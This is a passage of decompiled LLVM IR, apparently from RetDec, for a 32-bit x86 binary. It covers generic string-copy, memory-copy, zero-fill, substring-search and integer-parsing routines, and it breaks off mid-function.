  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp15 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8052641 = load i32, i32* @ebx, align 4
  store i32 %v0_8052641, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v4_8052646 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052646, i32* %edx.global-to-local, align 4
  %v2_805264a = load i8, i8* %tmp15, align 1
  %v3_805264a = icmp eq i8 %v2_805264a, 0
  br i1 %v3_805264a, label %dec_label_pc_8052674, label %dec_label_pc_805264f

dec_label_pc_805264f:                             ; preds = %dec_label_pc_8052640
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052651

dec_label_pc_8052651:                             ; preds = %dec_label_pc_8052651, %dec_label_pc_805264f
  %v0_8052651 = phi i32 [ %v1_8052651, %dec_label_pc_8052651 ], [ 0, %dec_label_pc_805264f ]
  %v1_8052651 = add i32 %v0_8052651, 1
  store i32 %v1_8052651, i32* %esi.global-to-local, align 4
  %v2_8052652 = add i32 %v1_8052651, %arg2
  %v3_8052652 = inttoptr i32 %v2_8052652 to i8*
  %v4_8052652 = load i8, i8* %v3_8052652, align 1
  %v5_8052652 = icmp eq i8 %v4_8052652, 0
  %v1_8052656 = icmp eq i1 %v5_8052652, false
  br i1 %v1_8052656, label %dec_label_pc_8052651, label %dec_label_pc_8052658

dec_label_pc_8052658:                             ; preds = %dec_label_pc_8052651
  %v10_8052658 = icmp eq i32 %v0_8052651, -2
  br i1 %v10_8052658, label %dec_label_pc_805266f, label %dec_label_pc_805265d

dec_label_pc_805265d:                             ; preds = %dec_label_pc_8052658
  store i32 %v4_8052646, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %v1_8052651, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052663

dec_label_pc_8052663:                             ; preds = %dec_label_pc_8052674, %dec_label_pc_805265d, %dec_label_pc_8052663.dec_label_pc_8052663_crit_edge
  %v2_8052666 = phi i32 [ %v1_8052669, %dec_label_pc_8052663.dec_label_pc_8052663_crit_edge ], [ %v4_8052646, %dec_label_pc_805265d ], [ %v4_8052646, %dec_label_pc_8052674 ]
  %v0_8052665 = phi i32 [ %v0_805266a, %dec_label_pc_8052663.dec_label_pc_8052663_crit_edge ], [ %v1_8052651, %dec_label_pc_805265d ], [ 0, %dec_label_pc_8052674 ]
  %v4_8052663 = phi i32 [ %v4_8052663.pre, %dec_label_pc_8052663.dec_label_pc_8052663_crit_edge ], [ %arg2, %dec_label_pc_805265d ], [ %arg2, %dec_label_pc_8052674 ]
  %v0_8052663 = phi i32 [ %v1_8052668, %dec_label_pc_8052663.dec_label_pc_8052663_crit_edge ], [ %arg2, %dec_label_pc_805265d ], [ %arg2, %dec_label_pc_8052674 ]
  %v1_8052663 = inttoptr i32 %v0_8052663 to i8*
  %v2_8052663 = load i8, i8* %v1_8052663, align 1
  %v3_8052663 = zext i8 %v2_8052663 to i32
  %v5_8052663 = and i32 %v4_8052663, -256
  %v6_8052663 = or i32 %v3_8052663, %v5_8052663
  store i32 %v6_8052663, i32* %eax.global-to-local, align 4
  %v1_8052665 = add i32 %v0_8052665, -1
  store i32 %v1_8052665, i32* %edx.global-to-local, align 4
  %v3_8052666 = inttoptr i32 %v2_8052666 to i8*
  store i8 %v2_8052663, i8* %v3_8052666, align 1
  %v0_8052668 = load i32, i32* @ecx, align 4
  %v1_8052668 = add i32 %v0_8052668, 1
  store i32 %v1_8052668, i32* @ecx, align 4
  %v0_8052669 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052669 = add i32 %v0_8052669, 1
  store i32 %v1_8052669, i32* %ebx.global-to-local, align 4
  %v0_805266a = load i32, i32* %edx.global-to-local, align 4
  %v10_805266a = icmp eq i32 %v0_805266a, -1
  %v1_805266d = icmp eq i1 %v10_805266a, false
  br i1 %v1_805266d, label %dec_label_pc_8052663.dec_label_pc_8052663_crit_edge, label %dec_label_pc_805266f.loopexit

dec_label_pc_8052663.dec_label_pc_8052663_crit_edge: ; preds = %dec_label_pc_8052663
  %v4_8052663.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052663

dec_label_pc_805266f.loopexit:                    ; preds = %dec_label_pc_8052663
  %v0_805266f.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8052671.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805266f

dec_label_pc_805266f:                             ; preds = %dec_label_pc_805266f.loopexit, %dec_label_pc_8052658
  %v2_8052671 = phi i32 [ %v2_8052671.pre, %dec_label_pc_805266f.loopexit ], [ %v0_8052641, %dec_label_pc_8052658 ]
  %v0_805266f = phi i32 [ %v0_805266f.pre, %dec_label_pc_805266f.loopexit ], [ %v1_8052651, %dec_label_pc_8052658 ]
  store i32 %v0_805266f, i32* %eax.global-to-local, align 4
  store i32 %v2_8052671, i32* @ebx, align 4
  ret i32 %v0_805266f

dec_label_pc_8052674:                             ; preds = %dec_label_pc_8052640
  store i32 %v4_8052646, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052663

; uselistorder directives
  uselistorder i32 %v0_805266f, { 1, 0 }
  uselistorder i32 %v1_8052669, { 1, 0 }
  uselistorder i32 %v1_8052668, { 1, 0 }
  uselistorder i32 %v1_8052651, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v4_8052646, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_8052663, { 0, 2, 1 }
}

define i32 @function_8052680(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052680:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052681 = load i32, i32* @ebx, align 4
  store i32 %v0_8052681, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_805268e = icmp eq i32 %arg3, 0
  br i1 %v1_805268e, label %dec_label_pc_805269f, label %dec_label_pc_8052692

dec_label_pc_8052692:                             ; preds = %dec_label_pc_8052680
  store i32 0, i32* %edx.global-to-local, align 4
  %v3_805269411 = inttoptr i32 %arg2 to i8*
  %v4_805269412 = load i8, i8* %v3_805269411, align 1
  %v6_805269714 = inttoptr i32 %arg1 to i8*
  store i8 %v4_805269412, i8* %v6_805269714, align 1
  %v0_805269a15 = load i32, i32* %edx.global-to-local, align 4
  %v1_805269a16 = add i32 %v0_805269a15, 1
  store i32 %v1_805269a16, i32* %edx.global-to-local, align 4
  %v12_805269b17 = icmp eq i32 %v1_805269a16, %arg3
  %v1_805269d18 = icmp eq i1 %v12_805269b17, false
  br i1 %v1_805269d18, label %dec_label_pc_8052694.dec_label_pc_8052694_crit_edge, label %dec_label_pc_805269f.loopexit

dec_label_pc_8052694.dec_label_pc_8052694_crit_edge: ; preds = %dec_label_pc_8052692, %dec_label_pc_8052694.dec_label_pc_8052694_crit_edge
  %v1_805269a20 = phi i32 [ %v1_805269a, %dec_label_pc_8052694.dec_label_pc_8052694_crit_edge ], [ %v1_805269a16, %dec_label_pc_8052692 ]
  %v1_8052694.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8052697.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8052694 = add i32 %v1_805269a20, %v1_8052694.pre
  %v3_8052694 = inttoptr i32 %v2_8052694 to i8*
  %v4_8052694 = load i8, i8* %v3_8052694, align 1
  %v5_8052697 = add i32 %v1_805269a20, %v4_8052697.pre
  %v6_8052697 = inttoptr i32 %v5_8052697 to i8*
  store i8 %v4_8052694, i8* %v6_8052697, align 1
  %v0_805269a = load i32, i32* %edx.global-to-local, align 4
  %v1_805269a = add i32 %v0_805269a, 1
  store i32 %v1_805269a, i32* %edx.global-to-local, align 4
  %v12_805269b = icmp eq i32 %v1_805269a, %arg3
  %v1_805269d = icmp eq i1 %v12_805269b, false
  br i1 %v1_805269d, label %dec_label_pc_8052694.dec_label_pc_8052694_crit_edge, label %dec_label_pc_805269f.loopexit

dec_label_pc_805269f.loopexit:                    ; preds = %dec_label_pc_8052694.dec_label_pc_8052694_crit_edge, %dec_label_pc_8052692
  %v4_8052694.lcssa = phi i8 [ %v4_805269412, %dec_label_pc_8052692 ], [ %v4_8052694, %dec_label_pc_8052694.dec_label_pc_8052694_crit_edge ]
  %phitmp = sext i8 %v4_8052694.lcssa to i32
  %v2_805269f.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805269f

dec_label_pc_805269f:                             ; preds = %dec_label_pc_805269f.loopexit, %dec_label_pc_8052680
  %v2_805269f = phi i32 [ %v0_8052681, %dec_label_pc_8052680 ], [ %v2_805269f.pre, %dec_label_pc_805269f.loopexit ]
  %.1 = phi i32 [ 0, %dec_label_pc_8052680 ], [ %phitmp, %dec_label_pc_805269f.loopexit ]
  store i32 %v2_805269f, i32* @ebx, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v1_805269a, { 1, 2, 0 }
  uselistorder i32 %v1_805269a20, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052694.dec_label_pc_8052694_crit_edge, { 1, 0 }
}

define i32 @function_80526b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80526b0:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80526b8 = icmp eq i32 %arg2, 0
  br i1 %v1_80526b8, label %dec_label_pc_80526b0.dec_label_pc_80526c9_crit_edge, label %dec_label_pc_80526bc

dec_label_pc_80526b0.dec_label_pc_80526c9_crit_edge: ; preds = %dec_label_pc_80526b0
  %v0_80526c9.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80526c9

dec_label_pc_80526bc:                             ; preds = %dec_label_pc_80526b0
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_80526c05 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_80526c05, align 1
  %v0_80526c46 = load i32, i32* %eax.global-to-local, align 4
  %v1_80526c47 = add i32 %v0_80526c46, 1
  store i32 %v1_80526c47, i32* %eax.global-to-local, align 4
  %v12_80526c58 = icmp eq i32 %v1_80526c47, %arg2
  %v1_80526c79 = icmp eq i1 %v12_80526c58, false
  br i1 %v1_80526c79, label %dec_label_pc_80526c0.dec_label_pc_80526c0_crit_edge, label %dec_label_pc_80526c9

dec_label_pc_80526c0.dec_label_pc_80526c0_crit_edge: ; preds = %dec_label_pc_80526bc, %dec_label_pc_80526c0.dec_label_pc_80526c0_crit_edge
  %v1_80526c410 = phi i32 [ %v1_80526c4, %dec_label_pc_80526c0.dec_label_pc_80526c0_crit_edge ], [ %v1_80526c47, %dec_label_pc_80526bc ]
  %v1_80526c0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_80526c0 = add i32 %v1_80526c410, %v1_80526c0.pre
  %v3_80526c0 = inttoptr i32 %v2_80526c0 to i8*
  store i8 0, i8* %v3_80526c0, align 1
  %v0_80526c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80526c4 = add i32 %v0_80526c4, 1
  store i32 %v1_80526c4, i32* %eax.global-to-local, align 4
  %v12_80526c5 = icmp eq i32 %v1_80526c4, %arg2
  %v1_80526c7 = icmp eq i1 %v12_80526c5, false
  br i1 %v1_80526c7, label %dec_label_pc_80526c0.dec_label_pc_80526c0_crit_edge, label %dec_label_pc_80526c9

dec_label_pc_80526c9:                             ; preds = %dec_label_pc_80526bc, %dec_label_pc_80526c0.dec_label_pc_80526c0_crit_edge, %dec_label_pc_80526b0.dec_label_pc_80526c9_crit_edge
  %v0_80526c9 = phi i32 [ %v0_80526c9.pre, %dec_label_pc_80526b0.dec_label_pc_80526c9_crit_edge ], [ %v1_80526c47, %dec_label_pc_80526bc ], [ %v1_80526c4, %dec_label_pc_80526c0.dec_label_pc_80526c0_crit_edge ]
  ret i32 %v0_80526c9

; uselistorder directives
  uselistorder i32 %v1_80526c4, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80526c9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80526c0.dec_label_pc_80526c0_crit_edge, { 1, 0 }
}

define i32 @function_80526d0() local_unnamed_addr {
dec_label_pc_80526d0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* @ecx, align 4
  %v7_80526e5 = icmp sgt i32 %tmp9, %tmp10
  br i1 %v7_80526e5, label %dec_label_pc_80526e7, label %dec_label_pc_80526f0

dec_label_pc_80526e7:                             ; preds = %dec_label_pc_8052702, %dec_label_pc_80526d0, %dec_label_pc_80526f0
  br label %dec_label_pc_80526ea

dec_label_pc_80526ea:                             ; preds = %dec_label_pc_8052715, %dec_label_pc_80526e7
  %storemerge = phi i32 [ -1, %dec_label_pc_80526e7 ], [ %v0_8052703, %dec_label_pc_8052715 ]
  ret i32 %storemerge

dec_label_pc_80526f0:                             ; preds = %dec_label_pc_80526d0
  %tmp17 = icmp slt i32 %tmp10, 1
  br i1 %tmp17, label %dec_label_pc_80526e7, label %dec_label_pc_80526f4

dec_label_pc_80526f4:                             ; preds = %dec_label_pc_80526f0
  %v2_805270c = add i32 %tmp, -1
  br label %dec_label_pc_8052708

dec_label_pc_8052700:                             ; preds = %dec_label_pc_8052708
  br label %dec_label_pc_8052702

dec_label_pc_8052702:                             ; preds = %dec_label_pc_8052715, %dec_label_pc_8052700
  %v2_80527103 = phi i32 [ %v1_8052715, %dec_label_pc_8052715 ], [ 0, %dec_label_pc_8052700 ]
  %v1_8052702 = add i32 %v0_8052702, 1
  %v1_8052703 = add i32 %v0_8052703, 1
  %v12_8052704 = icmp eq i32 %tmp10, %v1_8052702
  br i1 %v12_8052704, label %dec_label_pc_80526e7, label %dec_label_pc_8052708

dec_label_pc_8052708:                             ; preds = %dec_label_pc_8052702, %dec_label_pc_80526f4
  %v0_8052702 = phi i32 [ %v1_8052702, %dec_label_pc_8052702 ], [ 0, %dec_label_pc_80526f4 ]
  %v0_8052715 = phi i32 [ %v2_80527103, %dec_label_pc_8052702 ], [ 0, %dec_label_pc_80526f4 ]
  %v0_8052703 = phi i32 [ %v1_8052703, %dec_label_pc_8052702 ], [ 1, %dec_label_pc_80526f4 ]
  %v3_805270c = add i32 %v2_805270c, %v0_8052703
  %v4_805270c = inttoptr i32 %v3_805270c to i8*
  %v5_805270c = load i8, i8* %v4_805270c, align 1
  %v4_8052710 = add i32 %v0_8052715, %tmp8
  %v5_8052710 = inttoptr i32 %v4_8052710 to i8*
  %v6_8052710 = load i8, i8* %v5_8052710, align 1
  %v17_8052710 = icmp eq i8 %v5_805270c, %v6_8052710
  %v1_8052713 = icmp eq i1 %v17_8052710, false
  br i1 %v1_8052713, label %dec_label_pc_8052700, label %dec_label_pc_8052715

dec_label_pc_8052715:                             ; preds = %dec_label_pc_8052708
  %v1_8052715 = add i32 %v0_8052715, 1
  %v12_8052716 = icmp eq i32 %tmp9, %v1_8052715
  %v1_8052718 = icmp eq i1 %v12_8052716, false
  br i1 %v1_8052718, label %dec_label_pc_8052702, label %dec_label_pc_80526ea

; uselistorder directives
  uselistorder i32 %v0_8052703, { 2, 0, 1 }
  uselistorder i32 %v0_8052715, { 1, 0 }
  uselistorder i32 %v1_8052702, { 1, 0 }
  uselistorder label %dec_label_pc_80526e7, { 0, 2, 1 }
}

define i32 @function_8052720(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052720:
  %v4_8052727 = ptrtoint i8* %arg1 to i32
  %v4_8052730.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052730

dec_label_pc_8052730:                             ; preds = %dec_label_pc_8052744, %dec_label_pc_8052740, %dec_label_pc_8052730, %dec_label_pc_8052720
  %v4_8052730 = phi i32 [ %v4_8052730.pre, %dec_label_pc_8052720 ], [ %v6_8052730, %dec_label_pc_8052730 ], [ %v6_8052730, %dec_label_pc_8052740 ], [ %v6_8052730, %dec_label_pc_8052744 ]
  %v0_8052732 = phi i32 [ %v4_8052727, %dec_label_pc_8052720 ], [ %v1_8052732, %dec_label_pc_8052730 ], [ %v1_8052732, %dec_label_pc_8052740 ], [ %v1_8052732, %dec_label_pc_8052744 ]
  %v1_8052730 = inttoptr i32 %v0_8052732 to i8*
  %v2_8052730 = load i8, i8* %v1_8052730, align 1
  %v3_8052730 = zext i8 %v2_8052730 to i32
  %v5_8052730 = and i32 %v4_8052730, -256
  %v6_8052730 = or i32 %v3_8052730, %v5_8052730
  %v1_8052732 = add i32 %v0_8052732, 1
  %v7_805273c = icmp eq i8 %v2_8052730, 32
  br i1 %v7_805273c, label %dec_label_pc_8052730, label %dec_label_pc_8052740

dec_label_pc_8052740:                             ; preds = %dec_label_pc_8052730
  %v10_8052740 = icmp eq i8 %v2_8052730, 9
  br i1 %v10_8052740, label %dec_label_pc_8052730, label %dec_label_pc_8052744

dec_label_pc_8052744:                             ; preds = %dec_label_pc_8052740
  %v10_8052744 = icmp eq i8 %v2_8052730, 10
  br i1 %v10_8052744, label %dec_label_pc_8052730, label %dec_label_pc_8052748

dec_label_pc_8052748:                             ; preds = %dec_label_pc_8052744
  %tmp41 = sext i32 %arg2 to i64
  %v10_8052748 = icmp eq i8 %v2_8052730, 45
  br i1 %v10_8052748, label %dec_label_pc_80527fd, label %dec_label_pc_8052751

dec_label_pc_8052751:                             ; preds = %dec_label_pc_8052748
  %v10_8052751 = icmp eq i8 %v2_8052730, 43
  br i1 %v10_8052751, label %dec_label_pc_805282d, label %dec_label_pc_805275a

dec_label_pc_805275a:                             ; preds = %dec_label_pc_8052751, %dec_label_pc_805282d
  %v0_80527a430 = phi i32 [ %v1_8052732, %dec_label_pc_8052751 ], [ %v1_8052830, %dec_label_pc_805282d ]
  %v0_80527d016.in = phi i8 [ %v2_8052730, %dec_label_pc_8052751 ], [ %v2_805282d, %dec_label_pc_805282d ]
  %v2_80527ae9 = phi i8 [ %v2_8052730, %dec_label_pc_8052751 ], [ %v2_805282d, %dec_label_pc_805282d ]
  br label %dec_label_pc_8052767

dec_label_pc_8052767:                             ; preds = %dec_label_pc_80527fd, %dec_label_pc_805275a
  %v0_80527a429 = phi i32 [ %v1_8052805, %dec_label_pc_80527fd ], [ %v0_80527a430, %dec_label_pc_805275a ]
  %v0_80527d015.in = phi i8 [ %v2_80527fd, %dec_label_pc_80527fd ], [ %v0_80527d016.in, %dec_label_pc_805275a ]
  %v2_80527ae8 = phi i8 [ %v2_80527fd, %dec_label_pc_80527fd ], [ %v2_80527ae9, %dec_label_pc_805275a ]
  %v0_8052767 = phi i64 [ 2147483648, %dec_label_pc_80527fd ], [ 2147483647, %dec_label_pc_805275a ]
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_80527fd ], [ 0, %dec_label_pc_805275a ]
  %v12_805276b = udiv i64 %v0_8052767, %tmp41
  %v13_805276b = trunc i64 %v12_805276b to i32
  %v14_805276b = urem i64 %v0_8052767, %tmp41
  %v15_805276b = trunc i64 %v14_805276b to i32
  br label %dec_label_pc_80527ae

dec_label_pc_8052780:                             ; preds = %dec_label_pc_80527ae
  %v1_8052780 = add nsw i32 %v0_8052780, -48
  %v7_8052787 = icmp slt i32 %v1_8052780, %arg2
  br i1 %v7_8052787, label %dec_label_pc_8052789, label %dec_label_pc_80527da

dec_label_pc_8052789:                             ; preds = %dec_label_pc_8052780, %dec_label_pc_80527d0
  %v1_80527a1 = phi i32 [ %v1_8052780, %dec_label_pc_8052780 ], [ %v2_80527d2, %dec_label_pc_80527d0 ]
  %v2_8052789 = icmp slt i32 %v0_8052789, 0
  br i1 %v2_8052789, label %dec_label_pc_80527f8, label %dec_label_pc_805278d

dec_label_pc_805278d:                             ; preds = %dec_label_pc_8052789
  %tmp42 = icmp ugt i32 %v0_805278d, %v13_805276b
  br i1 %tmp42, label %dec_label_pc_80527f8, label %dec_label_pc_8052793

dec_label_pc_8052793:                             ; preds = %dec_label_pc_805278d
  %v15_805278d = icmp eq i32 %v0_805278d, %v13_805276b
  br i1 %v15_805278d, label %dec_label_pc_80527f2, label %dec_label_pc_8052795

dec_label_pc_8052795:                             ; preds = %dec_label_pc_80527f2, %dec_label_pc_8052793
  %v4_805279e = mul i32 %v1_805279e, %arg2
  %v2_80527a1 = add i32 %v1_80527a1, %v4_805279e
  br label %dec_label_pc_80527a4

dec_label_pc_80527a4:                             ; preds = %dec_label_pc_80527f8, %dec_label_pc_8052795
  %v1_805279e26 = phi i32 [ %v1_805279e, %dec_label_pc_80527f8 ], [ %v2_80527a1, %dec_label_pc_8052795 ]
  %v0_80527e220 = phi i32 [ %v0_805278d, %dec_label_pc_80527f8 ], [ %v2_80527a1, %dec_label_pc_8052795 ]
  %v0_80527da19 = phi i32 [ -1, %dec_label_pc_80527f8 ], [ 1, %dec_label_pc_8052795 ]
  %v1_80527a4 = inttoptr i32 %v0_80527a4 to i8*
  %v2_80527a4 = load i8, i8* %v1_80527a4, align 1
  %v1_80527aa = add i32 %v0_80527a4, 1
  br label %dec_label_pc_80527ae

dec_label_pc_80527ae:                             ; preds = %dec_label_pc_8052767, %dec_label_pc_80527a4
  %v0_80527a4 = phi i32 [ %v0_80527a429, %dec_label_pc_8052767 ], [ %v1_80527aa, %dec_label_pc_80527a4 ]
  %v1_805279e = phi i32 [ 0, %dec_label_pc_8052767 ], [ %v1_805279e26, %dec_label_pc_80527a4 ]
  %v0_805278d = phi i32 [ 0, %dec_label_pc_8052767 ], [ %v0_80527e220, %dec_label_pc_80527a4 ]
  %v0_8052789 = phi i32 [ 0, %dec_label_pc_8052767 ], [ %v0_80527da19, %dec_label_pc_80527a4 ]
  %v0_8052780.in = phi i8 [ %v0_80527d015.in, %dec_label_pc_8052767 ], [ %v2_80527a4, %dec_label_pc_80527a4 ]
  %v2_80527ae = phi i8 [ %v2_80527ae8, %dec_label_pc_8052767 ], [ %v2_80527a4, %dec_label_pc_80527a4 ]
  %v0_8052780 = sext i8 %v0_8052780.in to i32
  %v1_80527b1 = add i8 %v2_80527ae, -48
  %tmp43 = icmp ult i8 %v1_80527b1, 10
  br i1 %tmp43, label %dec_label_pc_8052780, label %dec_label_pc_80527b8

dec_label_pc_80527b8:                             ; preds = %dec_label_pc_80527ae
  %v1_80527b8 = add i8 %v2_80527ae, -65
  store i32 55, i32* @ecx, align 4
  %tmp44 = icmp ult i8 %v1_80527b8, 26
  br i1 %tmp44, label %dec_label_pc_80527d0, label %dec_label_pc_80527c4

dec_label_pc_80527c4:                             ; preds = %dec_label_pc_80527b8
  %v1_80527c4 = add i8 %v2_80527ae, -97
  %tmp45 = icmp ult i8 %v1_80527c4, 26
  br i1 %tmp45, label %dec_label_pc_80527cb, label %dec_label_pc_80527da

dec_label_pc_80527cb:                             ; preds = %dec_label_pc_80527c4
  store i32 87, i32* @ecx, align 4
  br label %dec_label_pc_80527d0

dec_label_pc_80527d0:                             ; preds = %dec_label_pc_80527b8, %dec_label_pc_80527cb
  %v1_80527d2 = phi i32 [ 55, %dec_label_pc_80527b8 ], [ 87, %dec_label_pc_80527cb ]
  %v2_80527d2 = sub nsw i32 %v0_8052780, %v1_80527d2
  %v7_80527d8 = icmp slt i32 %v2_80527d2, %arg2
  br i1 %v7_80527d8, label %dec_label_pc_8052789, label %dec_label_pc_80527da

dec_label_pc_80527da:                             ; preds = %dec_label_pc_8052780, %dec_label_pc_80527c4, %dec_label_pc_80527d0
  %v2_80527da = icmp slt i32 %v0_8052789, 0
  br i1 %v2_80527da, label %dec_label_pc_8052819, label %dec_label_pc_80527de

dec_label_pc_80527de:                             ; preds = %dec_label_pc_80527da
  store i32 %stack_var_-20.0, i32* @ecx, align 4
  %v1_80527e4 = icmp eq i32 %stack_var_-20.0, 0
  br i1 %v1_80527e4, label %dec_label_pc_80527ea, label %dec_label_pc_80527e8

dec_label_pc_80527e8:                             ; preds = %dec_label_pc_80527de
  %v1_80527e8 = sub i32 0, %v0_805278d
  br label %dec_label_pc_80527ea

dec_label_pc_80527ea:                             ; preds = %dec_label_pc_80527de, %dec_label_pc_80527e8
  %v0_80527f1 = phi i32 [ %v0_805278d, %dec_label_pc_80527de ], [ %v1_80527e8, %dec_label_pc_80527e8 ]
  ret i32 %v0_80527f1

dec_label_pc_80527f2:                             ; preds = %dec_label_pc_8052793
  %v5_80527f2 = sub i32 %v1_80527a1, %v15_805276b
  %v11_80527f2 = xor i32 %v1_80527a1, %v15_805276b
  %v12_80527f2 = xor i32 %v5_80527f2, %v1_80527a1
  %v13_80527f2 = and i32 %v12_80527f2, %v11_80527f2
  %v14_80527f2 = icmp slt i32 %v13_80527f2, 0
  %v15_80527f2 = icmp eq i32 %v5_80527f2, 0
  %v16_80527f2 = icmp slt i32 %v5_80527f2, 0
  %v3_80527f6 = icmp ne i1 %v16_80527f2, %v14_80527f2
  %v4_80527f6 = or i1 %v15_80527f2, %v3_80527f6
  br i1 %v4_80527f6, label %dec_label_pc_8052795, label %dec_label_pc_80527f8

dec_label_pc_80527f8:                             ; preds = %dec_label_pc_805278d, %dec_label_pc_80527f2, %dec_label_pc_8052789
  br label %dec_label_pc_80527a4

dec_label_pc_80527fd:                             ; preds = %dec_label_pc_8052748
  %v1_80527fd = inttoptr i32 %v1_8052732 to i8*
  %v2_80527fd = load i8, i8* %v1_80527fd, align 1
  %v1_8052805 = add i32 %v0_8052732, 2
  br label %dec_label_pc_8052767

dec_label_pc_8052819:                             ; preds = %dec_label_pc_80527da
  %v8_8052819 = icmp eq i32 %stack_var_-20.0, 0
  %v2_805281e = zext i1 %v8_8052819 to i32
  %v1_80528233 = or i32 %v2_805281e, -2147483648
  ret i32 %v1_80528233

dec_label_pc_805282d:                             ; preds = %dec_label_pc_8052751
  %v1_805282d = inttoptr i32 %v1_8052732 to i8*
  %v2_805282d = load i8, i8* %v1_805282d, align 1
  %v1_8052830 = add i32 %v0_8052732, 2
  br label %dec_label_pc_805275a

; uselistorder directives
  uselistorder i32 %v5_80527f2, { 1, 2, 0 }
  uselistorder i32 %v2_80527d2, { 1, 0 }
  uselistorder i8 %v2_80527a4, { 1, 0 }
  uselistorder i32 %v2_80527a1, { 1, 0 }
  uselistorder i32 %v1_80527a1, { 0, 1, 3, 2 }
  uselistorder i32 %v13_805276b, { 1, 0 }
  uselistorder i32 %v1_8052732, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_8052730, { 2, 1, 0 }
  uselistorder i8 %v2_8052730, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 %v0_8052732, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 4, 6, 5, 1, 7, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80527f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80527ea, { 1, 0 }
  uselistorder label %dec_label_pc_80527da, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80527d0, { 1, 0 }
  uselistorder label %dec_label_pc_80527ae, { 1, 0 }
  uselistorder label %dec_label_pc_8052789, { 1, 0 }
  uselistorder label %dec_label_pc_805275a, { 1, 0 }
}

define i32 @function_8052840(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052840:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8052841 = load i32, i32* @edi, align 4
  %v0_8052843 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @edi, align 4
  %v0_8052855.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8052855

dec_label_pc_8052855:                             ; preds = %dec_label_pc_805286d.dec_label_pc_8052855_crit_edge, %dec_label_pc_8052840
  %v0_805285c = phi i32 [ %v0_805285c.pre, %dec_label_pc_805286d.dec_label_pc_8052855_crit_edge ], [ %arg3, %dec_label_pc_8052840 ]
  %v1_8052856 = phi i32 [ %v1_8052868, %dec_label_pc_805286d.dec_label_pc_8052855_crit_edge ], [ 0, %dec_label_pc_8052840 ]
  %v0_8052856 = phi i32 [ %v1_805286d, %dec_label_pc_805286d.dec_label_pc_8052855_crit_edge ], [ %arg1, %dec_label_pc_8052840 ]
  %v0_8052855 = phi i32 [ %v1_8052865, %dec_label_pc_805286d.dec_label_pc_8052855_crit_edge ], [ %v0_8052855.pre, %dec_label_pc_8052840 ]
  %v2_8052856 = add i32 %v0_8052856, %v1_8052856
  %v4_805285d = inttoptr i32 %v2_8052856 to i32*
  %v5_805285d = call i32 @function_8052d5c(i32 %v0_805285c, i32* %v4_805285d, i32 1, i32 %v0_8052855)
  %v1_8052865 = add i32 %v5_805285d, -1
  %v8_8052865 = icmp eq i32 %v1_8052865, 0
  %v1_8052866 = icmp eq i1 %v8_8052865, false
